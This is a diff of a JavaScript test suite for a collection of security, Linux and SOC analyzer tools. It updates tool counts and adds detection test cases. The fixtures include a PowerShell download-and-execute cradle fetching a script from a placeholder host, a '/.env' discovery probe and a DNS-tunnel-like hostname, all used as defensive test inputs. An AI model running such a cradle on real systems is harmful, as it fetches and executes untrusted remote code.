@@ -205,12 +205,12 @@ test('homepage search and quick-access deep links resolve to real tool workspace
 test('tool registry has unique IDs and eleven declared workspaces', () => {
   const ids = tools.map(tool => tool.id);
   assert.equal(new Set(ids).size, ids.length);
-  assert.equal(tools.length, 170);
+  assert.equal(tools.length, 190);
   assert.deepEqual(
     [...new Set(tools.map(tool => tool.cat))].sort(),
     ['bash','cloud','database','developer','kali','linux','networking','security','soc','termux','ubuntu'].sort(),
   );
-  const expected={networking:19,security:29,soc:19,linux:30,ubuntu:12,kali:22,bash:13,termux:9,developer:13,cloud:3,database:1};
+  const expected={networking:21,security:33,soc:26,linux:32,ubuntu:12,kali:25,bash:13,termux:11,developer:13,cloud:3,database:1};
   for(const [category,count] of Object.entries(expected))
     assert.equal(tools.filter(tool=>tool.cat===category).length,count,category+' tool count');
 });
@@ -381,7 +381,7 @@ test('query string builder safely encodes values and preserves duplicate keys', 
 
 
 test('every registered utility has a unique ID, description, category and executable handler', () => {
-  assert.equal(tools.length, 170);
+  assert.equal(tools.length, 190);
   for (const tool of tools) {
     assert.match(tool.id, /^[a-z0-9-]+$/);
     assert.ok(tool.name && tool.name.length >= 5, tool.id + ' has a useful name');
@@ -816,6 +816,35 @@ test('Kali wireless, Linux access controls and SOC log triage analyzers handle r
     ['soc-ssh-auth-burst',{data:Array(5).fill('Failed password for root from 192.0.2.10 port 50001 ssh2').join('\n')},/192.0.2.10=5/],
     ['soc-zeek-dns-summary',{data:'#fields\tts\tquery\trcode_name\n1\texample.com\tNOERROR'},/example.com=1/],
     ['soc-yara-rule-audit',{data:'rule Broken { strings: $a = "x" }'},/condition section missing/],
+  ];
+  for (const [id,input,expected] of cases) {
+    assert.match(byId(id).run(input),expected,id+' representative finding');
+  }
+});
+
+
+test('Linux, Kali and SOC configuration and evidence analyzers cover representative edge cases', () => {
+  const cases = [
+    ['linux-nftables-audit',{data:'chain input { type filter hook input priority filter; policy accept; }'},/input chain default policy is accept/],
+    ['linux-pam-policy-audit',{data:'auth required pam_unix.so nullok'},/nullok permits empty passwords/],
+    ['linux-login-defs-audit',{data:'PASS_MAX_DAYS -1\nPASS_MIN_DAYS 0\nENCRYPT_METHOD MD5'},/PASS_MAX_DAYS missing, disabled or above 365/],
+    ['linux-mount-options-audit',{data:'tmpfs on /tmp type tmpfs (rw,relatime)'},/missing nosuid/],
+    ['linux-hosts-file-audit',{data:'203.0.113.10 example.com'},/non-local hostname override/],
+    ['linux-resolver-audit',{data:'nameserver 8.8.8.8'},/public resolver address configured/],
+    ['linux-known-hosts-audit',{data:'example.com ssh-dss AAAAB3NzaC1kc3MAAACBAQ'},/obsolete DSA host key/],
+    ['linux-ldd-audit',{data:'libbad.so => not found'},/unresolved dependency/],
+    ['termux-getprop-audit',{data:'[ro.debuggable]: [1]\n[ro.secure]: [0]'},/Android build is marked debuggable/],
+    ['termux-ssh-client-audit',{data:'Host *\n StrictHostKeyChecking no\n ForwardAgent yes'},/host-key verification is disabled/],
+    ['kali-monitor-capability-review',{data:'Supported interface modes:\n * managed\n * AP'},/Monitor mode advertised: NOT FOUND/],
+    ['kali-wireless-interface-review',{data:'Interface wlan0\n type monitor'},/wlan0: monitor/],
+    ['soc-zeek-http-summary',{data:'#fields\tts\tmethod\thost\tstatus_code\n1\tGET\texample.com\t404'},/Statuses: 404=1/],
+    ['soc-zeek-ssl-summary',{data:'#fields\tts\tversion\tvalidation_status\n1\tTLSv13\t ok'},/TLSv13=1/],
+    ['soc-powershell-4104-triage',{data:'IEX (New-Object Net.WebClient).DownloadString("https://example.invalid/a.ps1")'},/Remote content retrieval/],
+    ['soc-windows-rdp-triage',{data:'{"EventID":4624,"LogonType":10,"IpAddress":"192.0.2.10"}'},/RDP logons: 1/],
+    ['soc-firewall-log-summary',{data:'kernel: [UFW BLOCK] SRC=192.0.2.10 DST=198.51.100.20 DPT=22'},/192.0.2.10=1/],
+    ['soc-dns-tunnel-heuristic',{data:'verylongencodedpayloadsegment12345678901234567890.tunnel.example.com'},/long DNS label/],
+    ['soc-web-probe-triage',{data:'GET /.env HTTP/1.1'},/Sensitive file discovery/],
+    ['kali-nmap-grepable-review',{data:'Host: 192.0.2.10 (server.example) Status: Up\nHost: 192.0.2.10 (server.example) Ports: 22/open/tcp//ssh///'},/Open ports parsed: 1/],
   ];
   for (const [id,input,expected] of cases) {
     assert.match(byId(id).run(input),expected,id+' representative finding');
